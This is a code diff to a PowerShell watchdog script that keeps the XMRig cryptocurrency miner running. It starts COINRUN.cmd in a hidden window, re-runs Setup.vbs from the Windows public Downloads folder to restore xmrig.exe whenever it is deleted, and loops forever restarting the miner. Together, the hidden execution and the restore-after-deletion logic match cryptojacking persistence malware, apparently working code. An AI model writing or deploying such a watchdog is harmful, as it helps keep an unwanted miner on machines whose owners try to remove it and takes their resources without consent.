@@ -4,17 +4,23 @@ $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $xmrigProcessName = "xmrig"
 
 function Start-CoinRun {
-    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru -WindowStyle Hidden
-    Write-Host "Started COINRUN.cmd silently."
+    $existing = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
+    if (!$existing) {
+        $global:coinRunProcess = Start-Process -FilePath "cmd.exe" `
+            -ArgumentList "/c `"$coinRunPath`"" `
+            -PassThru -WindowStyle Hidden
+        Write-Host "COINRUN.cmd started silently."
+    } else {
+        Write-Host "XMRig is already running. Skipped starting again."
+    }
 }
 
-# Initial check
 if (Test-Path $xmrigPath) {
     Start-CoinRun
 } else {
-    Write-Warning "xmrig.exe not found..."
+    Write-Warning "xmrig.exe not found."
     if (Test-Path $setupPath) {
-        Write-Host "Running Setup.vbs to recover..."
+        Write-Host "Running Setup.vbs to restore xmrig..."
         Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
         while (!(Test-Path $xmrigPath)) {
             Write-Host "Waiting for xmrig.exe..."
@@ -26,15 +32,15 @@ if (Test-Path $xmrigPath) {
     }
 }
 
-# Main loop
 while ($true) {
+
     if (!(Test-Path $xmrigPath)) {
-        Write-Warning "xmrig.exe deleted. Trying to recover..."
+        Write-Warning "xmrig.exe was deleted. Restoring..."
 
         if (Test-Path $setupPath) {
             Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
             while (!(Test-Path $xmrigPath)) {
-                Write-Host "Waiting for xmrig.exe to return..."
+                Write-Host "Waiting for xmrig.exe to restore..."
                 Start-Sleep -Seconds 3
             }
             Start-CoinRun
@@ -43,17 +49,17 @@ while ($true) {
         }
     }
 
-    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
-        Write-Warning "coinrun.cmd exited. Restarting..."
-        Start-CoinRun
-    }
-
     $xmrigRunning = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
     if (-not $xmrigRunning) {
-        Write-Warning "xmrig.exe stopped. Restarting coinrun.cmd..."
+        Write-Warning "xmrig.exe not running. Restarting..."
         Start-CoinRun
     } else {
-        Write-Host "xmrig.exe is running."
+        Write-Host "xmrig.exe is running normally."
+    }
+
+    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
+        Write-Warning "COINRUN.cmd exited. Restarting..."
+        Start-CoinRun
     }
 
     Start-Sleep -Seconds 3
